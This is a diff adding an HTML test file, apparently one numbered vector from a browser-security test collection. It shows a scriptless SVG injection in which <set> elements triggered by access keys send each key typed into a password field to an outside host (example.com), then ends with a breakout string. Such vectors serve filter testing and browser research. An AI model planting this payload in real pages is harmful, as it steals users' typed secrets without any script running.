@@ -1,0 +1,14 @@
+<div id="132"><!doctype html>
+<form>
+<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+<br>
+<input name="secret" type="password">
+</form>
+<!-- injection --><svg height="50px">
+<image xmlns:xlink="http://www.w3.org/1999/xlink">
+<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
+<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
+<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
+<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
+</image>
+</svg>//["'`-->]]>]</div>
